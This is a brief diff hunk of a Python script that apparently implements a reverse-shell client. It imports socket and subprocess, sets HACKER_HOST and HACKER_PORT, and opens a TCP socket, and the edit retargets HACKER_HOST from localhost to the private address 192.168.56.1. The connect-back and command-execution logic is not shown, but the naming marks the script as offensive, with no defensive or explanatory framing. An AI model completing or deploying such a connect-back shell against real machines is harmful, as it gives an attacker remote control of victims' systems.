@@ -1,7 +1,7 @@
 import socket
 import subprocess
 
-HACKER_HOST = '127.0.0.1'
+HACKER_HOST = '192.168.56.1'
 HACKER_PORT = 9999
 
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
